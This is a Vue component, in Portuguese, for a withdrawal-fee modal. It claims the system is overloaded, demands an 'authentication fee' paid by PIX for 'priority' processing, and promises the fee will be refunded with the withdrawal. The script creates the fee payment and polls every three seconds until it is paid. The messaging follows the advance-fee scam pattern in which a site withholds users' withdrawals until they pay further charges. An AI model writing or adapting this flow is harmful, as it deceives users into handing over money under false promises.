<template>
    <div class="modal-overlay active" @click.self="$emit('close')">
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3 class="modal-title">Taxa de Saque</h3>
                <button class="modal-close" @click="$emit('close')">&times;</button>
            </div>
            <div class="modal-body">
                <div style="text-align: center; margin-bottom: 20px;">
                    <div style="background: linear-gradient(135deg, #fef3c7 0%, #fde68a 100%); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 2px solid #fbbf24;">
                        <p style="font-size: 18px; color: #92400e; margin-bottom: 12px; font-weight: 700;">
                            ⚠️ Sistema Sobrecarregado
                        </p>
                        <p style="font-size: 14px; color: #78350f; line-height: 1.6; margin-bottom: 15px;">
                            Nosso sistema está recebendo um volume muito alto de solicitações de saque no momento. 
                            Para garantir que você tenha <strong>prioridade no processamento</strong> e seu saque seja 
                            analisado com urgência, estamos cobrando uma taxa de autenticação de 
                            <strong style="color: #16a34a; font-size: 16px;">R$ {{ formatCurrency(feeAmount) }}</strong>.
                        </p>
                        <p style="font-size: 14px; color: #78350f; line-height: 1.6; font-weight: 600;">
                            💰 Esta taxa será <strong>creditada junto ao valor do seu saque</strong> após a aprovação!
                        </p>
                    </div>
                    <p style="font-size: 13px; color: #6b7280; line-height: 1.5;">
                        Ao pagar a taxa, você garante que seu saque será processado com prioridade e o valor da taxa 
                        será adicionado ao valor final do seu saque quando aprovado.
                    </p>
                </div>

                <!-- Botão Pagar Taxa -->
                <button
                    @click="$emit('pay-fee')"
                    class="modal-button"
                    style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); width: 100%; font-size: 16px; font-weight: 700; padding: 16px;"
                >
                    💳 Pagar Taxa de Saque
                </button>
            </div>
        </div>
    </div>
</template>

<script>
import { ref, onMounted, onUnmounted } from 'vue';

export default {
    name: 'WithdrawalFeeModal',
    props: {
        withdrawalId: {
            type: Number,
            required: true,
        },
        feeAmount: {
            type: Number,
            required: true,
        },
    },
    setup(props, { emit }) {
        const qrCodeUrl = ref(null);
        const pixCode = ref('');
        const loading = ref(false);
        const checkingPayment = ref(false);
        const copied = ref(false);
        let paymentCheckInterval = null;

        const internalApiRequest = async (url, options = {}) => {
            const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
            
            const defaultOptions = {
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-CSRF-TOKEN': csrfToken || '',
                },
                credentials: 'same-origin',
            };

            const response = await fetch(url, {
                ...defaultOptions,
                ...options,
                headers: {
                    ...defaultOptions.headers,
                    ...(options.headers || {}),
                },
            });

            if (!response.ok) {
                const error = await response.json().catch(() => ({ message: 'Erro de rede.' }));
                throw new Error(error.message || 'Erro de rede.');
            }

            return response.json();
        };

        const generatePayment = async () => {
            loading.value = true;
            try {
                const response = await internalApiRequest('/api/withdrawals/fee/payment', {
                    method: 'POST',
                    body: JSON.stringify({
                        withdrawal_id: props.withdrawalId,
                        fee_amount: props.feeAmount,
                    }),
                });

                if (response.success) {
                    qrCodeUrl.value = response.qr_code_url || response.qr_code;
                    pixCode.value = response.pix_code || response.qr_code_text || '';
                    
                    // Inicia verificação de pagamento
                    checkingPayment.value = true;
                    startPaymentCheck();
                } else {
                    throw new Error(response.message || 'Erro ao gerar pagamento.');
                }
            } catch (error) {
                if (window.showErrorToast) {
                    window.showErrorToast(error.message || 'Erro ao gerar pagamento.');
                } else if (window.Notiflix) {
                    window.Notiflix.Notify.failure(`❄️ ${error.message || 'Erro ao gerar pagamento.'}`);
                }
            } finally {
                loading.value = false;
            }
        };

        const startPaymentCheck = () => {
            paymentCheckInterval = setInterval(async () => {
                try {
                    const response = await internalApiRequest(`/api/withdrawals/${props.withdrawalId}/fee/status`);
                    
                    if (response.success && response.fee_paid) {
                        // Taxa paga! Para verificação e fecha modal
                        clearInterval(paymentCheckInterval);
                        checkingPayment.value = false;
                        
                        if (window.showSuccessToast) {
                            window.showSuccessToast('Taxa de saque paga com sucesso! Seu saque foi enviado para análise.');
                        } else if (window.Notiflix) {
                            window.Notiflix.Report.success(
                                '✅ Taxa Paga!',
                                'Sua taxa de saque foi confirmada. Seu saque foi enviado para análise e será processado em breve.',
                                'OK'
                            );
                        }
                        
                        emit('fee-paid');
                        setTimeout(() => {
                            window.location.reload();
                        }, 1500);
                    }
                } catch (error) {
                    console.error('Erro ao verificar pagamento:', error);
                }
            }, 3000); // Verifica a cada 3 segundos
        };

        const copyPixCode = () => {
            if (pixCode.value) {
                navigator.clipboard.writeText(pixCode.value).then(() => {
                    copied.value = true;
                    setTimeout(() => {
                        copied.value = false;
                    }, 2000);
                });
            }
        };

        const formatCurrency = (value) => {
            return new Intl.NumberFormat('pt-BR', {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2,
            }).format(value || 0);
        };

        onUnmounted(() => {
            if (paymentCheckInterval) {
                clearInterval(paymentCheckInterval);
            }
        });

        return {
            qrCodeUrl,
            pixCode,
            loading,
            checkingPayment,
            copied,
            generatePayment,
            copyPixCode,
            formatCurrency,
        };
    },
};
</script>

<style scoped>
.modal-button {
    padding: 12px 24px;
    font-size: 16px;
    font-weight: 600;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    transition: all 0.3s;
}

.modal-button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
}
</style>

